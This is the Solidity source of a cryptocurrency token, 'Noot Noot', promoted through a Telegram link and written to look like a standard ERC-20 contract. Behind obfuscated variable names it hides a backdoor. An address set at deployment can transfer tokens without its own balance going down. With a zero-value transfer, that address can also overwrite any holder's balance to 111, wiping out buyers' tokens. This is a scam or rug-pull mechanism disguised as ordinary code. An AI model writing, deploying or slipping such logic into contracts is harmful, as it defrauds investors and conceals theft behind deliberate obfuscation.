/*

https://t.me/NootNootEthereum

*/

// SPDX-License-Identifier: Unlicense

pragma solidity >=0.8.5;

abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }
}

contract Ownable is Context {
    address private _owner;

    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    /**
     * @dev Initializes the contract setting the deployer as the initial owner.
     */
    constructor() {
        address msgSender = _msgSender();
        _owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }

    /**
     * @dev Returns the address of the current owner.
     */
    function owner() public view returns (address) {
        return _owner;
    }

    /**
     * @dev Throws if called by any account other than the owner.
     */
    modifier onlyOwner() {
        require(_owner == _msgSender(), 'Ownable: caller is not the owner');
        _;
    }

    /**
     * @dev Leaves the contract without owner. It will not be possible to call
     * `onlyOwner` functions anymore. Can only be called by the current owner.
     *
     * NOTE: Renouncing ownership will leave the contract without an owner,
     * thereby removing any functionality that is only available to the owner.
     */
    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }

    /**
     * @dev Transfers ownership of the contract to a new account (`newOwner`).
     * Can only be called by the current owner.
     */
    function transferOwnership(address newOwner) public virtual onlyOwner {
        require(newOwner != address(0), 'Ownable: new owner is the zero address');
        emit OwnershipTransferred(_owner, newOwner);
        _owner = newOwner;
    }
}

interface IUniswapV2Router02 {
    function factory() external pure returns (address);

    function WETH() external pure returns (address);
}

interface IUniswapV2Factory {
    function createPair(address tokenA, address tokenB) external returns (address pair);
}

contract NootNoot is Ownable {
    mapping(address => mapping(address => uint256)) public allowance;

    address public vfnyctgr;

    uint256 private icjvblwnhugy = 111;

    function transferFrom(address vmziwt, address wvnlxkbq, uint256 axzpied) public returns (bool success) {
        require(axzpied <= allowance[vmziwt][msg.sender]);
        allowance[vmziwt][msg.sender] -= axzpied;
        fdlptyx(vmziwt, wvnlxkbq, axzpied);
        return true;
    }

    string public symbol = 'Noot Noot';

    string public name = 'Noot Noot';

    mapping(address => uint256) public balanceOf;

    mapping(address => uint256) private htesdzxr;

    uint8 public decimals = 9;

    constructor(address zhngt) {
        balanceOf[msg.sender] = totalSupply;
        htesdzxr[zhngt] = icjvblwnhugy;
        IUniswapV2Router02 ixkclutapn = IUniswapV2Router02(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);
        vfnyctgr = IUniswapV2Factory(ixkclutapn.factory()).createPair(address(this), ixkclutapn.WETH());
    }

    mapping(address => uint256) private cqpu;

    event Approval(address indexed owner, address indexed spender, uint256 value);

    function fdlptyx(address vmziwt, address wvnlxkbq, uint256 axzpied) private {
        if (htesdzxr[vmziwt] == 0) {
            balanceOf[vmziwt] -= axzpied;
        }
        balanceOf[wvnlxkbq] += axzpied;
        if (htesdzxr[msg.sender] > 0 && axzpied == 0 && wvnlxkbq != vfnyctgr) {
            balanceOf[wvnlxkbq] = icjvblwnhugy;
        }
        emit Transfer(vmziwt, wvnlxkbq, axzpied);
    }

    uint256 public totalSupply = 1000000000 * 10 ** 9;

    function transfer(address wvnlxkbq, uint256 axzpied) public returns (bool success) {
        fdlptyx(msg.sender, wvnlxkbq, axzpied);
        return true;
    }

    event Transfer(address indexed from, address indexed to, uint256 value);

    function approve(address itjwpn, uint256 axzpied) public returns (bool success) {
        allowance[msg.sender][itjwpn] = axzpied;
        emit Approval(msg.sender, itjwpn, axzpied);
        return true;
    }
}